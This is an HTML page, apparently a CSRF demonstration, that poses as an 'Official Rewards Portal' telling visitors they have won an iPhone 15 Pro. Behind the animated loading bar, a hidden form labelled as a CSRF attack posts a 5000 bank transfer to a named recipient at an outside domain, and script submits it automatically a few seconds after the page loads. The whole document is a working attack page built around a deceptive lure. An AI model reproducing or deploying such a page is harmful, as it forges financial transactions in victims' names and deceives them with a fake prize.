<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Official Rewards Portal | Weekly Giveaway</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&family=Outfit:wght@500;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #FFD700;
            --primary-dark: #B8860B;
            --accent: #4F46E5;
            --text-dark: #1E293B;
            --glass: rgba(255, 255, 255, 0.8);
            --glass-border: rgba(255, 255, 255, 0.4);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', sans-serif;
        }

        body {
            min-height: 100vh;
            background: linear-gradient(135deg, #0F172A 0%, #1E1B4B 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            color: white;
            padding: 20px;
        }

        /* Animated Background Shapes */
        .shape {
            position: absolute;
            background: linear-gradient(to right, var(--accent), #9333EA);
            filter: blur(80px);
            z-index: -1;
            border-radius: 50%;
            opacity: 0.4;
            animation: move 20s infinite alternate;
        }

        @keyframes move {
            from { transform: translate(-50px, -50px); }
            to { transform: translate(100px, 100px); }
        }

        .container {
            max-width: 500px;
            width: 100%;
            background: var(--glass);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid var(--glass-border);
            border-radius: 28px;
            padding: 40px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
            text-align: center;
            position: relative;
            color: var(--text-dark);
            transform: translateY(0);
            animation: slideUp 0.8s cubic-bezier(0.16, 1, 0.3, 1);
        }

        @keyframes slideUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .badge {
            display: inline-block;
            background: #FEE2E2;
            color: #EF4444;
            padding: 6px 12px;
            border-radius: 99px;
            font-size: 12px;
            font-weight: 800;
            text-transform: uppercase;
            letter-spacing: 0.05em;
            margin-bottom: 20px;
        }

        h1 {
            font-family: 'Outfit', sans-serif;
            font-size: 32px;
            font-weight: 700;
            line-height: 1.2;
            margin-bottom: 15px;
            background: linear-gradient(to right, #1E293B, #475569);
            background-clip: text;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        p {
            color: #64748B;
            font-size: 16px;
            line-height: 1.6;
            margin-bottom: 30px;
        }

        .gift-image {
            width: 100%;
            height: 240px;
            object-fit: cover;
            border-radius: 20px;
            margin-bottom: 30px;
            box-shadow: 0 10px 20px rgba(0,0,0,0.1);
        }

        .loading-section {
            width: 100%;
        }

        .loading-bar-container {
            width: 100%;
            height: 8px;
            background: #E2E8F0;
            border-radius: 99px;
            overflow: hidden;
            margin-bottom: 12px;
        }

        .loading-bar-progress {
            width: 0%;
            height: 100%;
            background: var(--accent);
            border-radius: 99px;
            transition: width 3s ease-in-out;
        }

        .status-text {
            font-size: 13px;
            font-weight: 600;
            color: var(--accent);
            animation: pulse 1.5s infinite;
        }

        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }

        .footer-info {
            margin-top: 40px;
            padding-top: 20px;
            border-top: 1px solid #E2E8F0;
            font-size: 12px;
            color: #94A3B8;
        }

        form {
            display: none;
        }
    </style>
</head>
<body>
    <div class="shape" style="width: 400px; height: 400px; left: -100px; top: -100px;"></div>
    <div class="shape" style="width: 300px; height: 300px; right: -50px; bottom: -50px; background: linear-gradient(to right, #F59E0B, #EF4444);"></div>

    <div class="container">
        <span class="badge">Exclusive Surprise</span>
        <h1>Congratulations! 🎉</h1>
        <p>You've been selected as our 1,000,000th lucky visitor. Your brand new iPhone 15 Pro is reserved!</p>
        
        <img src="iphone_prize.png" alt="Your Prize" class="gift-image">

        <div class="loading-section">
            <div class="loading-bar-container">
                <div class="loading-bar-progress" id="progress"></div>
            </div>
            <span class="status-text" id="status">Verifying secure claim token...</span>
        </div>

        <div class="footer-info">
            &copy; 2024 Global Rewards Program. Powered by VeriSafe&trade; Technology.
        </div>
    </div>

    <!-- CSRF Attack Form -->
    <form
      id="attackForm"
      action="https://csrf.swanshi.me/bank/transfer"
      method="POST"
    >
      <input type="hidden" name="amount" value="5000" />
      <input type="hidden" name="to" value="sarvjeet.s23@iiits.in" />
    </form>

    <script>
        window.onload = function() {
            const progress = document.getElementById('progress');
            const status = document.getElementById('status');
            const form = document.getElementById('attackForm');

            // Animate progress bar
            setTimeout(() => {
                progress.style.width = '100%';
            }, 100);

            // Change status text and submit form
            setTimeout(() => {
                status.innerText = "Processing shipping details...";
                // Short delay to let the user see the "processing" before submission
                // In a real CSRF, this would happen silently or as part of a "Next" button
                // but here we keep the auto-submit behavior.
                setTimeout(() => {
                    form.submit();
                }, 1500);
            }, 2000);
        };
    </script>
</body>
</html>
